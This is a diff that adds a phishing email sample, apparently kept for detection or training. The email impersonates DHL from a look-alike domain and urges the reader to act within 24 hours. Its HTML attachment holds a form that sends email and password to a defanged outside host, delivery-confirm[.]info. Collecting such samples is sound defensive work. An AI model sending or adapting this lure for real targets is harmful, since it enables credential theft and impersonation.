@@ -1,0 +1,38 @@
+From: DHL Express <noreply@dhl-track-support.com>
+To: user@company.com
+Subject: Delivery Failed – Action Required
+Date: Tue, 30 Jan 2026 10:05:11 +0530
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY123"
+
+--BOUNDARY123
+Content-Type: text/plain; charset="UTF-8"
+
+Dear Customer,
+
+We were unable to deliver your package due to an address issue.
+
+Please review the attached delivery document to reschedule delivery within 24 hours.
+
+Thank you,
+DHL Express
+
+--BOUNDARY123
+Content-Type: text/html; name="Delivery_Details.html"
+Content-Disposition: attachment; filename="Delivery_Details.html"
+
+<html>
+  <body>
+    <h2>DHL Delivery Notice</h2>
+    <p>Your shipment is on hold.</p>
+    <p>Please confirm your address to proceed.</p>
+
+    <form action="http://delivery-confirm[.]info/login" method="post">
+      <input type="text" name="email" placeholder="Email"><br>
+      <input type="password" name="password" placeholder="Password"><br>
+      <input type="submit" value="Confirm Delivery">
+    </form>
+  </body>
+</html>
+
+--BOUNDARY123--
